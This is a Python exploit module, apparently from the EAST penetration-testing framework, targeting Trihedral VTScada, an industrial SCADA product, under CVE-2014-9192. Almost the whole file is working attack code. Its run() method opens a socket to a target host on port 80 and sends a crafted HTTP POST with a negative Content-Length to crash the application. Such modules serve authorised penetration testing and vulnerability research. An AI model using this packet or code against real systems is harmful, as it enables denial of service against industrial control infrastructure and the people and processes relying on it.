#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import time
import socket

sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_trihedral_vtscada_dos"
INFO['DESCRIPTION'] = "Trihedral VTScada - Denial Of Service"
INFO['VENDOR'] = "https://www.trihedral.com/"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['']
INFO["CVE Name"] = "CVE-2014-9192"
INFO["NOTES"] = """This module send a special crafted packet to the 80 port to crash the application."""

INFO['CHANGELOG'] = "1 May, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/DoS/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS['HOST'] = '192.168.1.189', dict(description = 'Target IP')
OPTIONS['PORT'] = 80, dict(description = 'Target Port')


class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', OPTIONS['HOST'])
        self.port = int(self.args.get('PORT', self.port))
    
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        packet = 'POST /%7FVIC HTTP/1.1\r\n'
        packet += 'Content-Type: text/xml\r\n'
        packet += 'Content-Length: -1\r\n\r\n'
        packet += 'EAST\r\n\r\n'
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host, self.port))
            s.sendall(packet)
            time.sleep(5)
            s.close()
        except Exception as e:
            self.log(e)
            self.finish(False)
        
        self.finish(True)
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
